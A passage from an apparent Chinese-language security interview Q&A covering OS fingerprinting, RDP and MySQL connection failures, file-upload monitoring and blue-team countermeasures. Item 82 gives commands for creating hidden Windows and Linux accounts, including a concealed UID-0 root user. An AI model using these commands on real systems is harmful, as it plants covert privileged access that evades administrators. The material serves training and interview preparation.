  • 大小写敏感：Linux 区分大小写，Windows 不区分。改变 URL 路径大小写，若仍返回相同内容，可能为 Windows。
  • HTTP 包 Server 头：Microsoft-IIS 暗示 Windows，Apache/2.4.xx (Ubuntu) 暗示 Linux。
  • TTL 值猜测：默认 Linux TTL 64，Windows 128。
  • 查看前端行为或报错页面路径分隔符（\ 或 /）。
  • PHP 页面 phpinfo() 泄露系统信息。
  • SMB 服务开放（445）通常表明 Windows 环境。

81. 无法连接服务器 3389 端口的几种情况？

  • 远程桌面服务未开启或未监听 3389。
  • 防火墙阻止 3389 入站。
  • 网络策略（ACL/安全组）未放行。
  • RDP 端口被修改为其他端口（注册表修改）。
  • 网络连通性问题（路由不可达）。
  • 目标服务因防护策略（如系统级 IPS）断开恶意连接。
  • 账户限制（如 NLA 网络级认证失败）。

82. 如何建立隐藏用户？

Windows 下：

  • 命令行 net user test$ password /add，用户名以 $ 结尾，在 net user 列表中不显示。
  • 修改注册表，克隆管理员账号的 SAM 注册表项，使账户在用户管理中不可见。
    Linux 下：
  • 直接修改 /etc/passwd 和 /etc/shadow，添加无 shell 或伪装的 UID 0 账户。
  • 使用 useradd -o -u 0 -g 0 -M -s /bin/bash hidden 创建隐藏性强的 root 权限账户。

Linux下：

  • 直接修改 /etc/passwd 添加 UID 0 账户

    伪装成系统服务名，UID 为 0，拥有 root 权限，肉眼不易发现。

  • 使用 useradd 创建 UID 0 用户

    不创建家目录，UID/GID 与 root 相同，直接获取 root 权限。

83. 为什么 MySQL 数据库的站点，无法连接？

  • 数据库服务未运行或端口未监听。
  • 防火墙/安全组阻止 3306 端口访问。
  • MySQL 的 bind-address 绑定为 127.0.0.1，不允许远程。
  • 用户权限限制，user 表中 Host 字段未允许远程 IP。
  • 网络不通或连接超时。
  • 客户端与服务器版本/加密插件不兼容。
  • MySQL 最大连接数已满。

84. 文件上传功能的监测点有哪些？

  • 前端：文件扩展名、MIME 类型、大小。
  • 后端：$_FILES 数组、文件临时路径。
  • 存储位置：上传后文件实际保存的目录权限和命名。
  • 请求流量：Content-Type、multipart 数据体是否包含 Webshell 内容。
  • 日志：访问日志中 POST 上传请求，关注路径和状态码 200/201。
  • 文件属性：上传后检查文件内容是否包含恶意代码（如 <?php），而不是仅看扩展名。

93. 蓝队常用的反制手段有哪些？

  • 蜜罐/蜜标：部署高交互蜜罐捕获攻击行为，反向监听。
  • 浏览器反制：在攻击者访问的页面嵌入 JS 获取浏览器指纹、真实 IP（WebRTC）。
  • 诱导文件：在服务器放置带宏或水印的“诱饵”文件，记录下载者信息。
  • 封锁与隔离：封锁攻击 IP，通过 ACL/防火墙快速阻断。
  • 溯源反制：利用攻击工具留下的特征（如 Webshell 密码、User-Agent）反向追踪服务器。
  • 身份反制：若攻击者登录社工账户，通过关联信息收集身份。
  • 协同打压：联动威胁情报共享，通报攻击队信息（护网场景），进行封禁。
  • 断网、跳板：必要时切断失陷主机网络，防止横向移动。
